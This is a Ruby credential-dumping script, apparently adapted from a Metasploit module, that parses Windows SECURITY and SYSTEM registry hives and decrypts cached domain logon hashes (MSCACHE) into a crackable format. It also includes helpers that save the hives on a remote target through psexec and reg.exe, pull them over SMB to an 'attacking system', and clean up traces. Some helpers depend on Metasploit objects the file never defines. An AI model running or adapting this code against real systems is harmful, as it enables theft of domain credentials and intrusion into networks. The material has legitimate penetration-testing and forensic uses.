#!/usr/bin/env ruby
require 'digest'
require 'openssl'

# This is the main control method
def run(secpath, syspath)
	credentials = Table.new(
		'Header'    => "MSCACHE Credentials",
		'Indent'    => 1,
		'Columns'   =>
		[
			"Username",
			"Hash",
			"Logon Domain Name",
			"DNS Domain Name",
			"Last Login",
			"UPN",
			"Effective Name",
			"Full Name",
			"Logon Script",
			"Profile Path",
			"Home Directory",
			"HomeDir Drive",
			"Primary Group",
			"Additional Groups"
		])
	dump_cache_creds(secpath, syspath, credentials)
end



# This method attempts to use reg.exe to generate copies of the SYSTEM, and SECURITY registry hives
# and store them in the Windows Temp directory on the remote host
def save_reg_hives(secpath, syspath)
	puts("Creating hive copies")
	begin
		# Try to save the hive files
		command = "%COMSPEC% /C reg.exe save HKLM\\SECURITY #{secpath} /y && reg.exe save HKLM\\SYSTEM #{syspath} /y"
		return psexec(command)
	rescue StandardError => saveerror
		puts("Unable to create hive copies. #{saveerror}")
		return false
	end
end



# Method used to copy hive files from C:\WINDOWS\Temp* on the remote host
# To the local file path specified in datastore['LOGDIR'] on attacking system
def download_hives(syspath, secpath, logdir)
	puts("Downloading SYSTEM and SECURITY hive files.")
	begin
		newdir = "#{logdir}/#{@ip}"
		::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
		simple.connect("\\\\#{@ip}\\#{@smbshare}")

		# Get contents of hive file
		remotesec = simple.open("#{secpath}", 'rob')
		remotesys = simple.open("#{syspath}", 'rob')
		secdata = remotesec.read
		sysdata = remotesys.read

		# Save it to local file system
		localsec = File.open("#{logdir}/#{@ip}/sec", "wb+")
		localsys = File.open("#{logdir}/#{@ip}/sys", "wb+")
		localsec.write(secdata)
		localsys.write(sysdata)

		localsec.close
		localsys.close
		remotesec.close
		remotesys.close
		simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
		return true
	rescue StandardError => copyerror
		puts("Unable to download hive copies - #{copyerror}")
		return false
	end
end



# This method should hopefully open up a hive file from yoru local system and allow interacting with it
def open_hives(path)
	begin
		puts("Opening hives on the local Attack system")
		sys = Rex::Registry::Hive.new("#{path}/#{@ip}/sys")
		sec = Rex::Registry::Hive.new("#{path}/#{@ip}/sec")
		return sys, sec
	rescue StandardError => openerror
		puts("Unable to open hives.  May not have downloaded properly. #{openerror}")
		return nil, nil
	end
end


# Removes files created during execution.
def cleanup_after(files)
	simple.connect("\\\\#{@ip}\\#{@smbshare}")
	puts("Executing cleanup...")
	files.each do |file|
		begin
			if smb_file_exist?(file)
				smb_file_rm(file)
			end
		rescue Rex::Proto::SMB::Exceptions::ErrorCode => cleanuperror
			puts("Unable to cleanup #{file}. Error: #{cleanuperror}")
		end
	end
	left = files.collect{ |f| smb_file_exist?(f) }
	if left.any?
		puts("Unable to cleanup. Maybe you'll need to manually remove #{left.join(", ")} from the target.")
	else
		puts("Cleanup was successful")
	end
	simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
end



# Extracts the Domain Cached hashes from the hive files
def dump_cache_creds(sec, sys, credentials)
	puts("Extracting Domain Cached Password hashes.")
	bootkey = get_boot_key(sys)
	lsa_key = get_lsa_key(sec, bootkey)
	nlkm = get_nlkm(sec, lsa_key)
	if bootkey && lsa_key && nlkm
		begin
			puts("Dumping cached credentials...")
			ok = sec.relative_query('\Cache')
			john = ""
			ok.value_list.values.each do |usr|
				if( "NL$Control" == usr.name) then
					next
				end
				begin
					nl = usr.value.data
				rescue
					next
				end
				cache = parse_cache_entry(nl)
				if ( cache.userNameLength > 0 )
					if( @vista == 1 )
						dec_data = decrypt_hash_vista(cache.enc_data, nlkm, cache.ch)
					else
						dec_data = decrypt_hash(cache.enc_data, nlkm, cache.ch)
					end
					john += parse_decrypted_cache(dec_data, cache, credentials)
				end
			end
			john.split("\n").each do |pass|
				puts "#{pass}"
			end
			if( @vista == 1 )
				puts("Hashes are in MSCACHE_VISTA format. (mscash2)")
			else
				puts("Hashes are in MSCACHE format. (mscash)")
			end
		rescue StandardError => e
			puts("No cached hashes found")
		end
	else
		puts("System does not appear to store any cached credentials")
		return
	end
end


# Extract the NLKM value from the SECURITY hive using the Lsa key
def get_nlkm(sec, lsa_key)
	begin
		nlkm = sec.relative_query('\Policy\Secrets\NL$KM\CurrVal').value_list.values[0].value.data
		if @vista == 1
			decrypted = decrypt_lsa( nlkm[0..-1], lsa_key)  
		else
			decrypted = decrypt_secret( nlkm[0xC..-1], lsa_key )
		end
		return decrypted
	rescue StandardError => nlkmerror
		return nil
	end
end



# Decrypt a single hash
def decrypt_hash(edata, nlkm, ch)
	rc4key = OpenSSL::HMAC.digest(OpenSSL::Digest::Digest.new('md5'), nlkm, ch)
	rc4 = OpenSSL::Cipher::Cipher.new("rc4")
	rc4.key = rc4key
	dec  = rc4.update(edata)
	dec << rc4.final
	return dec
end

def decrypt_hash_vista(edata, nlkm, ch)
	aes = OpenSSL::Cipher::Cipher.new('aes-128-cbc')
	aes.key = nlkm[16...-1]
	aes.padding = 0
	aes.decrypt
	aes.iv = ch

	jj = ""
	for i in (0...edata.length).step(16)
		xx = aes.update(edata[i...i+16])
		jj += xx
	end
	return jj	
end



# Code sampled from post/windows/gather/cachedump.rb
def parse_decrypted_cache(dec_data, s, credentials)
	i = 0
	hash = dec_data[i...i+0x10]
	i+=72

	username = dec_data[i...i+(s.userNameLength)].split("\x00\x00").first.gsub("\x00", '')
	i+=s.userNameLength
	i+=2 * ( ( s.userNameLength / 2 ) % 2 )

	last = Time.at(s.lastAccess)

	domain = dec_data[i...i+s.domainNameLength+1]
	i+=s.domainNameLength

	if( s.dnsDomainNameLength != 0)
		dnsDomainName = dec_data[i...i+s.dnsDomainNameLength+1].split("\x00\x00").first.gsub("\x00", '')
		i+=s.dnsDomainNameLength
		i+=2 * ( ( s.dnsDomainNameLength / 2 ) % 2 )
	end

	if( s.upnLength != 0)
		upn = dec_data[i...i+s.upnLength+1].split("\x00\x00").first.gsub("\x00", '')
		i+=s.upnLength
		i+=2 * ( ( s.upnLength / 2 ) % 2 )
	end

	if( s.effectiveNameLength != 0 )
		effectiveName = dec_data[i...i+s.effectiveNameLength+1].split("\x00\x00").first.gsub("\x00", '')
		i+=s.effectiveNameLength
		i+=2 * ( ( s.effectiveNameLength / 2 ) % 2 )
	end

	if( s.fullNameLength != 0 )
		fullName = dec_data[i...i+s.fullNameLength+1].split("\x00\x00").first.gsub("\x00", '')
		i+=s.fullNameLength
		i+=2 * ( ( s.fullNameLength / 2 ) % 2 )
	end

	if( s.logonScriptLength != 0 )
		logonScript = dec_data[i...i+s.logonScriptLength+1].split("\x00\x00").first.gsub("\x00", '')
		i+=s.logonScriptLength
		i+=2 * ( ( s.logonScriptLength / 2 ) % 2 )
	end

	if( s.profilePathLength != 0 )
		profilePath = dec_data[i...i+s.profilePathLength+1].split("\x00\x00").first.gsub("\x00", '')
		i+=s.profilePathLength
		i+=2 * ( ( s.profilePathLength / 2 ) % 2 )
	end

	if( s.homeDirectoryLength != 0 )
		homeDirectory = dec_data[i...i+s.homeDirectoryLength+1].split("\x00\x00").first.gsub("\x00", '')
		i+=s.homeDirectoryLength
		i+=2 * ( ( s.homeDirectoryLength / 2 ) % 2 )
	end

	if( s.homeDirectoryDriveLength != 0 )
		homeDirectoryDrive = dec_data[i...i+s.homeDirectoryDriveLength+1].split("\x00\x00").first.gsub("\x00", '')
		i+=s.homeDirectoryDriveLength
		i+=2 * ( ( s.homeDirectoryDriveLength / 2 ) % 2 )
	end

	relativeId = []
	while (s.groupCount > 0) do
		# Todo: parse attributes
		relativeId << dec_data[i...i+4].unpack("V")[0]
		i+=4
		attributes = dec_data[i...i+4].unpack("V")[0]
		i+=4
		s.groupCount-=1
	end


	if( s.logonDomainNameLength != 0 )
		logonDomainName = dec_data[i...i+s.logonDomainNameLength+1].split("\x00\x00").first.gsub("\x00", '')
		i+=s.logonDomainNameLength
		i+=2 * ( ( s.logonDomainNameLength / 2 ) % 2 )
	end

	credentials <<
	[
		username,
		hash.unpack("H*")[0],
		logonDomainName,
		dnsDomainName,
		last.strftime("%F %T"),
		upn,
		effectiveName,
		fullName,
		logonScript,
		profilePath,
		homeDirectory,
		homeDirectoryDrive,
		s.primaryGroupId,
		relativeId.join(' '),
	]

	return "#{username.downcase}:#{hash.unpack("H*")[0]}:#{dnsDomainName.downcase}:#{logonDomainName.downcase}\n"
end



# Code sampled from post/windows/gather/cachedump.rb
def parse_cache_entry(cache_data)
	j = Struct.new(
		:userNameLength,
		:domainNameLength,
		:effectiveNameLength,
		:fullNameLength,
		:logonScriptLength,
		:profilePathLength,
		:homeDirectoryLength,
		:homeDirectoryDriveLength,
		:userId,
		:primaryGroupId,
		:groupCount,
		:logonDomainNameLength,
		:logonDomainIdLength,
		:lastAccess,
		:last_access_time,
		:revision,
		:sidCount,
		:valid,
		:sifLength,
		:logonPackage,
		:dnsDomainNameLength,
		:upnLength,
		:ch,
		:enc_data
	)

	s = j.new()

	s.userNameLength = cache_data[0,2].unpack("v")[0]
	s.domainNameLength =  cache_data[2,2].unpack("v")[0]
	s.effectiveNameLength = cache_data[4,2].unpack("v")[0]
	s.fullNameLength = cache_data[6,2].unpack("v")[0]
	s.logonScriptLength = cache_data[8,2].unpack("v")[0]
	s.profilePathLength = cache_data[10,2].unpack("v")[0]
	s.homeDirectoryLength = cache_data[12,2].unpack("v")[0]
	s.homeDirectoryDriveLength = cache_data[14,2].unpack("v")[0]

	s.userId = cache_data[16,4].unpack("V")[0]
	s.primaryGroupId = cache_data[20,4].unpack("V")[0]
	s.groupCount = cache_data[24,4].unpack("V")[0]
	s.logonDomainNameLength = cache_data[28,2].unpack("v")[0]
	s.logonDomainIdLength = cache_data[30,2].unpack("v")[0]

	#Removed ("Q") unpack and replaced as such
	thi = cache_data[32,4].unpack("V")[0]
	tlo = cache_data[36,4].unpack("V")[0]
	q = (tlo.to_s(16) + thi.to_s(16)).to_i(16)
	s.lastAccess = ((q / 10000000) - 11644473600)

	s.revision = cache_data[40,4].unpack("V")[0]
	s.sidCount = cache_data[44,4].unpack("V")[0]
	s.valid = cache_data[48,4].unpack("V")[0]
	s.sifLength = cache_data[52,4].unpack("V")[0]

	s.logonPackage  = cache_data[56,4].unpack("V")[0]
	s.dnsDomainNameLength = cache_data[60,2].unpack("v")[0]
	s.upnLength = cache_data[62,2].unpack("v")[0]

	s.ch = cache_data[64,16]
	s.enc_data = cache_data[96..-1]

	return s
end



# Code sampled from post/windows/gather/cachedump.rb
def convert_des_56_to_64(kstr)
	des_odd_parity = [
		1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
		16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
		32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
		49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
		64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
		81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
		97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
		112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
		128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
		145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
		161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
		176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
		193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
		208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
		224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
		241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
	]

	key = []
	str = kstr.unpack("C*")

	key[0] = str[0] >> 1
	key[1] = ((str[0] & 0x01) << 6) | (str[1] >> 2)
	key[2] = ((str[1] & 0x03) << 5) | (str[2] >> 3)
	key[3] = ((str[2] & 0x07) << 4) | (str[3] >> 4)
	key[4] = ((str[3] & 0x0F) << 3) | (str[4] >> 5)
	key[5] = ((str[4] & 0x1F) << 2) | (str[5] >> 6)
	key[6] = ((str[5] & 0x3F) << 1) | (str[6] >> 7)
	key[7] = str[6] & 0x7F

	0.upto(7) do |i|
		key[i] = ( key[i] << 1)
		key[i] = des_odd_parity[key[i]]
	end
	return key.pack("C*")
end



# Code sampled from post/windows/gather/cachedump.rb
# Ruby implementation of SystemFunction005
# the original python code has been taken from Credump
def decrypt_secret(secret, key)
	j = 0
	decrypted_data = ''
	for i in (0...secret.length).step(8)
		enc_block = secret[i..i+7]
		block_key = key[j..j+6]
		des_key = convert_des_56_to_64(block_key)
		d1 = OpenSSL::Cipher::Cipher.new('des-ecb')

		d1.padding = 0
		d1.key = des_key
		d1o = d1.update(enc_block)
		d1o << d1.final
		decrypted_data += d1o
		j += 7
		if (key[j..j+7].length < 7 )
			j = key[j..j+7].length - 1
		end
	end
	dec_data_len = decrypted_data[0].ord
	return decrypted_data[8..8+dec_data_len]
end



# Code sampled from post/windows/gather/cachedump.rb
def decrypt_lsa(pol, encryptedkey)
	sha256x = Digest::SHA256.new()
	sha256x << encryptedkey
	(1..1000).each do
		sha256x << pol[28,32]
	end
	aes = OpenSSL::Cipher::Cipher.new("aes-256-cbc")
	aes.key = sha256x.digest
	decryptedkey = ''
	for i in (60...pol.length).step(16)
		aes.decrypt
		aes.padding = 0
		xx = aes.update(pol[i...i+16])
		decryptedkey += xx
	end
	return decryptedkey
end



# Code sampled from post/windows/gather/cachedump.rb
def get_lsa_key(sec, bootkey)
	puts "Extacting the LSA key"
	begin
		enc_reg_key = sec.relative_query('\Policy\PolSecretEncryptionKey')
		obf_lsa_key = enc_reg_key.value_list.values[0].value.data
		if obf_lsa_key.size > 4
			@vista = 0
		else
			enc_reg_key = sec.relative_query('\Policy\PolEKList')
			obf_lsa_key = enc_reg_key.value_list.values[0].value.data
			@vista = 1
		end
	rescue
		puts "Couldn't not determine vista or non vista..."
	end
	
	begin
		if ( @vista == 1 )
			lsa_key = decrypt_lsa(obf_lsa_key, bootkey)
			lsa_key = lsa_key[68,32]
		else
			md5x = Digest::MD5.new()
			md5x << bootkey
			(1..1000).each do
				md5x.update(obf_lsa_key[60,76])
			end
			rc4 = OpenSSL::Cipher::Cipher.new("rc4")
			rc4.key = md5x.digest()
			lsa_key	= rc4.update(obf_lsa_key[12,60])
			lsa_key << rc4.final
			lsa_key = lsa_key[0x10..0x20]
		end
		return lsa_key
	rescue StandardError => lsaerror
		return nil
	end
end

# Code sampled from post/windows/gather/cachedump.rb
def get_boot_key(hive)
	begin
		puts("Getting boot key")

		default_control_set = hive.value_query('\Select\Default').value.data.unpack("c").first

		bootkey = ""
		basekey = "\\ControlSet00#{default_control_set}\\Control\\Lsa"
		
		%W{JD Skew1 GBG Data}.each do |k|
			ok = hive.relative_query(basekey + "\\" + k)
			return nil if not ok
			tmp = ""
			0.upto(ok.class_name_length - 1) do |i|
				next if i%2 == 1
				tmp << ok.class_name_data[i,1]
			end
			#bootkey << [tmp].pack("H*")
			bootkey << [tmp.to_i(16)].pack("V")
		end
		keybytes = bootkey.unpack("C*")


		#p = [ 11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4 ]
		p = [ 0x0b, 0x06, 0x07, 0x01, 0x08, 0x0a, 0x0e, 0x00, 0x03, 0x05, 0x02, 0x0f, 0x0d, 0x09, 0x0c, 0x04 ]
		scrambled = ""
		p.each do |i|
			scrambled << bootkey[i]
		end
		return scrambled
	rescue StandardError => boot_key_error
		return nil
	end
end

class Table
	#
	# Initializes a text table instance using the supplied properties.  The
	# Table class supports the following hash attributes:
	#
	# Header
	#
	#	The string to display as a heading above the table.  If none is
	#	specified, no header will be displayed.
	#
	# HeaderIndent
	#
	# 	The amount of space to indent the header.  The default is zero.
	#
	# Columns
	#
	# 	The array of columns that will exist within the table.
	#
	# Rows
	#
	# 	The array of rows that will exist.
	#
	# Width
	#
	# 	The maxgtimum width of the table in characters.
	#
	# Indent
	#
	# 	The number of characters to indent the table.
	#
	# CellPad
	#
	# 	The number of characters to put between each horizontal cell.
	#
	# Prefix
	#
	# 	The text to prefix before the table.
	#
	# Postfix
	#
	# 	The text to affix to the end of the table.
	#
	# Sortindex
	#
	#	The column to sort the table on, -1 disables sorting.
	#
	def initialize(opts = {})
		self.header   = opts['Header']
		self.headeri  = opts['HeaderIndent'] || 0
		self.columns  = opts['Columns'] || []
		# updated below if we got a "Rows" option
		self.rows     = []

		self.width    = opts['Width']   || 80
		self.indent   = opts['Indent']  || 0
		self.cellpad  = opts['CellPad'] || 2
		self.prefix   = opts['Prefix']  || ''
		self.postfix  = opts['Postfix'] || ''
		self.colprops = []

		self.sort_index  = opts['SortIndex'] || 0

		# Default column properties
		self.columns.length.times { |idx|
			self.colprops[idx] = {}
			self.colprops[idx]['MaxWidth'] = self.columns[idx].length
		}

		# ensure all our internal state gets updated with the given rows by
		# using add_row instead of just adding them to self.rows.  See #3825.
		opts['Rows'].each { |row| add_row(row) } if opts['Rows']

		# Merge in options
		if (opts['ColProps'])
			opts['ColProps'].each_key { |col|
				idx = self.columns.index(col)

				if (idx)
					self.colprops[idx].merge!(opts['ColProps'][col])
				end
			}
		end

	end

	#
	# Converts table contents to a string.
	#
	def to_s
		str  = prefix.dup
		str << header_to_s || ''
		str << columns_to_s || ''
		str << hr_to_s || ''

		sort_rows
		rows.each { |row|
			if (is_hr(row))
				str << hr_to_s
			else
				str << row_to_s(row)
			end
		}

		str << postfix

		return str
	end

	#
	# Converts table contents to a csv
	#
	def to_csv
		str = ''
		str << ( columns.join(",") + "\n" )
		rows.each { |row|
			next if is_hr(row)
			str << ( row.map{|x|
				x = x.to_s

				x.gsub(/[\r\n]/, ' ').gsub(/\s+/, ' ').gsub('"', '""')
			}.map{|x| "\"#{x}\"" }.join(",") + "\n" )
		}
		str
	end

	#
	#
	# Returns the header string.
	#
	def header_to_s # :nodoc:
		if (header)
			pad = " " * headeri

			return pad + header + "\n" + pad + "=" * header.length + "\n\n"
		end

		return ''
	end

	#
	# Prints the contents of the table.
	#
	def print
		puts to_s
	end

	#
	# Adds a row using the supplied fields.
	#
	def <<(fields)
		add_row(fields)
	end

	#
	# Adds a row with the supplied fields.
	#
	def add_row(fields = [])
		if fields.length != self.columns.length
			raise RuntimeError, 'Invalid number of columns!'
		end
		fields.each_with_index { |field, idx|
			if (colprops[idx]['MaxWidth'] < field.to_s.length)
				colprops[idx]['MaxWidth'] = field.to_s.length
			end
		}

		rows << fields
	end

	#
	# Sorts the rows based on the supplied index of sub-arrays
	# If the supplied index is an IPv4 address, handle it differently, but
	# avoid actually resolving domain names.
	#
	def sort_rows(index=sort_index)
		return if index == -1
		return unless rows
		rows.sort! do |a,b|
			if a[index].nil?
				-1
			elsif b[index].nil?
				1
			elsif Rex::Socket.dotted_ip?(a[index]) and Rex::Socket.dotted_ip?(b[index])
				Rex::Socket::addr_atoi(a[index]) <=> Rex::Socket::addr_atoi(b[index])
			elsif a[index] =~ /^[0-9]+$/ and b[index] =~ /^[0-9]+$/
				a[index].to_i <=> b[index].to_i
			else
				a[index] <=> b[index] # assumes otherwise comparable.
			end
		end
	end

	#
	# Adds a horizontal line.
	#
	def add_hr
		rows << '__hr__'
	end

	alias p print

	attr_accessor :header, :headeri # :nodoc:
	attr_accessor :columns, :rows, :colprops # :nodoc:
	attr_accessor :width, :indent, :cellpad # :nodoc:
	attr_accessor :prefix, :postfix # :nodoc:
	attr_accessor :sort_index # :nodoc:

protected

	#
	# Defaults cell widths and alignments.
	#
	def defaults # :nodoc:
		self.columns.length.times { |idx|
		}
	end

	#
	# Checks to see if the row is an hr.
	#
	def is_hr(row) # :nodoc:
		return ((row.kind_of?(String)) && (row == '__hr__'))
	end

	#
	# Converts the columns to a string.
	#
	def columns_to_s # :nodoc:
		nameline = ' ' * indent
		barline  = nameline.dup
		last_col = nil
		last_idx = nil
		columns.each_with_index { |col,idx|
			if (last_col)
				nameline << pad(' ', last_col, last_idx)

				remainder = colprops[last_idx]['MaxWidth'] - last_col.length
			if (remainder < 0)
				remainder = 0
			end
				barline << (' ' * (cellpad + remainder))
			end
			nameline << col
			barline << ('-' * col.length)

			last_col = col
			last_idx = idx
		}

		return "#{nameline}\n#{barline}"
	end

	#
	# Converts an hr to a string.
	#
	def hr_to_s # :nodoc:
		return "\n"
	end

	#
	# Converts a row to a string.
	#
	def row_to_s(row) # :nodoc:
		line = ' ' * indent
		last_cell = nil
		last_idx = nil
		row.each_with_index { |cell, idx|
			if (last_cell)
				line << pad(' ', last_cell.to_s, last_idx)
			end
			line << cell.to_s
			# line << pad(' ', cell.to_s, idx)
			last_cell = cell
			last_idx = idx
		}

		return line + "\n"
	end

	#
	# Pads out with the supplied character for the remainder of the space given
	# some text and a column index.
	#
	def pad(chr, buf, colidx, use_cell_pad = true) # :nodoc:
		remainder = colprops[colidx]['MaxWidth'] - buf.length
		val       = chr * remainder;

		if (use_cell_pad)
			val << ' ' * cellpad
		end

		return val
	end


end

class Hive
	attr_accessor :root_key, :hive_regf, :hive_name

	def initialize(hivepath)

		hive_blob = open(hivepath, "rb") { |io| io.read }

		@hive_regf = RegfBlock.new(hive_blob)
		return nil if !@hive_regf.root_key_offset

		@root_key = NodeKey.new(hive_blob, 0x1000 + @hive_regf.root_key_offset)
		return nil if !@root_key.lf_record

		keys = []
		root_key.lf_record.children.each do |key|
			keys << key.name
		end

		if keys.include? "LastKnownGoodRecovery"
			@hive_name = "SYSTEM"
		elsif keys.include? "Microsoft"
			@hive_name = "SOFTWARE"
		elsif keys.include? "Environment"
			@hive_name = "NTUSER.DAT"
		elsif keys.include? "SAM"
			@hive_name = "SAM"
		elsif keys.include? "Policy"
			@hive_name = "SECURITY"
		else
			@hive_name = "UNKNOWN"
		end

	end

	def relative_query(path)

		if path == "" || path == "\\"
			return @root_key
		end

		current_child = nil
		paths = path.split("\\")

		return if !@root_key.lf_record

		@root_key.lf_record.children.each do |child|
			next if child.name.downcase != paths[1].downcase

			current_child = child

			if paths.length == 2
				current_child.full_path = path
				return current_child
			end

			2.upto(paths.length) do |i|

				if i == paths.length
					current_child.full_path = path
					return current_child
				else
					if current_child.lf_record && current_child.lf_record.children
						current_child.lf_record.children.each do |c|
							next if c.name.downcase != paths[i].downcase

							current_child = c

							break
						end
					end
				end
			end
		end

		return if !current_child

		current_child.full_path = path
		return current_child
		end

		def value_query(path)
			if path == "" || path == "\\"
			return nil
		end

		paths = path.split("\\")

		return if !@root_key.lf_record

		@root_key.lf_record.children.each do |root_child|
			next if root_child.name.downcase != paths[1].downcase

			current_child = root_child

			if paths.length == 2
				return nil
			end

			2.upto(paths.length - 1) do |i|
				next if !current_child.lf_record

				current_child.lf_record.children.each do |c|
					next if c.name != paths[i]
					current_child = c

					break
				end
			end

			if !current_child.value_list || current_child.value_list.values.length == 0
				return nil
			end

			current_child.value_list.values.each do |value|
				next if value.name.downcase != paths[paths.length - 1].downcase

				value.full_path = path
				return value
			end
		end
	end
end

class LFBlock

	attr_accessor :number_of_keys, :hash_records, :children

	def initialize(hive_blob, offset)
		offset = offset + 4
		lf_header = hive_blob[offset, 2]

		if lf_header !~ /lf/ && lf_header !~ /lh/
			return
		end

		@number_of_keys = hive_blob[offset + 0x02, 2].unpack('C').first

		@hash_records = []
		@children = []

		hash_offset = offset + 0x04

		1.upto(@number_of_keys) do |h|

			hash = LFHashRecord.new(hive_blob, hash_offset)

			@hash_records << hash

			hash_offset = hash_offset + 0x08

			@children << NodeKey.new(hive_blob, hash.nodekey_offset + 0x1000)
		end
	end
end

class LFHashRecord

	attr_accessor :nodekey_offset, :nodekey_name_verification

	def initialize(hive_blob, offset)
		@nodekey_offset = hive_blob[offset, 4].unpack('l').first
		@nodekey_name_verification = hive_blob[offset+0x04, 4].to_s
	end

end

class NodeKey

	attr_accessor :timestamp, :parent_offset, :subkeys_count, :lf_record_offset
	attr_accessor :value_count, :value_list_offset, :security_key_offset
	attr_accessor :class_name_offset, :name_length, :class_name_length, :full_path
	attr_accessor :name, :lf_record, :value_list, :class_name_data, :readable_timestamp

	def initialize(hive, offset)

		offset = offset + 0x04

		nk_header = hive[offset, 2]
		nk_type = hive[offset+0x02, 2]

		if nk_header !~ /nk/
			return
		end

		@timestamp = hive[offset+0x04, 8].unpack('q').first
		@parent_offset = hive[offset+0x10, 4].unpack('l').first
		@subkeys_count = hive[offset+0x14, 4].unpack('l').first
		@lf_record_offset = hive[offset+0x1c, 4].unpack('l').first
		@value_count = hive[offset+0x24, 4].unpack('l').first
		@value_list_offset = hive[offset+0x28, 4].unpack('l').first
		@security_key_offset = hive[offset+0x2c, 4].unpack('l').first
		@class_name_offset = hive[offset+0x30, 4].unpack('l').first
		@name_length = hive[offset+0x48, 2].unpack('c').first
		@class_name_length = hive[offset+0x4a, 2].unpack('c').first
		@name = hive[offset+0x4c, @name_length].to_s

		windows_time = @timestamp
		unix_time = windows_time/10000000-11644473600
		ruby_time = Time.at(unix_time)

		@readable_timestamp = ruby_time

		@lf_record = LFBlock.new(hive, @lf_record_offset + 0x1000) if @lf_record_offset != -1
		@value_list = ValueList.new(hive, @value_list_offset + 0x1000, @value_count) if @value_list_offset != -1

		@class_name_data = hive[@class_name_offset + 0x04 + 0x1000, @class_name_length]

	end

end

class RegfBlock

	attr_accessor :timestamp, :root_key_offset

	def initialize(hive)

		regf_header = hive[0x00, 4]

		if regf_header !~ /regf/
			puts "Not a registry hive"
			return
		end

		@timestamp = hive[0x0C, 8].unpack('q').first
		@root_key_offset = 0x20

	end
end

class ValueKey

	attr_accessor :name_length, :length_of_data, :data_offset, :full_path
	attr_accessor :value_type, :readable_value_type, :name, :value

	def initialize(hive, offset)
		offset = offset + 4

		vk_header = hive[offset, 2]

		if vk_header !~ /vk/
			puts "no vk at offset #{offset}"
			return
		end

		@name_length = hive[offset+0x02, 2].unpack('c').first
		@length_of_data = hive[offset+0x04, 4].unpack('l').first
		@data_offset = hive[offset+ 0x08, 4].unpack('l').first
		@value_type = hive[offset+0x0C, 4].unpack('c').first

		if @value_type == 1
			@readable_value_type = "Unicode character string"
		elsif @value_type == 2
			@readable_value_type = "Unicode string with %VAR% expanding"
		elsif @value_type == 3
			@readable_value_type = "Raw binary value"
		elsif @value_type == 4
			@readable_value_type = "Dword"
		elsif @value_type == 7
			@readable_value_type = "Multiple unicode strings separated with '\\x00'"
		end

		flag = hive[offset+0x10, 2].unpack('c').first

		if flag == 0
			@name = "Default"
		else
			@name = hive[offset+0x14, @name_length].to_s
		end

		@value = ValueKeyData.new(hive, @data_offset, @length_of_data, @value_type, offset)
	end
end

class ValueKeyData

	attr_accessor :data

	def initialize(hive, offset, length, datatype, parent_offset)
		offset = offset + 4

		#If the data-size is lower than 5, the data-offset value is used to store
		#the data itself!
		if length < 5
			@data = hive[parent_offset + 0x08, 4]
		else
			@data = hive[offset + 0x1000, length]
		end
	end
end

class ValueList

	attr_accessor :values

	def initialize(hive, offset, number_of_values)
		offset = offset + 4
		inner_offset = 0

		@values = []

		1.upto(number_of_values) do |v|
			valuekey_offset = hive[offset + inner_offset, 4]
			next if !valuekey_offset

			valuekey_offset = valuekey_offset.unpack('l').first
			@values << ValueKey.new(hive, valuekey_offset + 0x1000)
			inner_offset = inner_offset + 4
		end
	end
end

unless ARGV.length > 1
	puts "./cachedump.rb [SECURITY HIVE] [SYSTEM HIVE]\r\n\r\n"
	exit!
end

secpath = Hive.new(ARGV[0])
syspath = Hive.new(ARGV[1])
run(secpath, syspath)
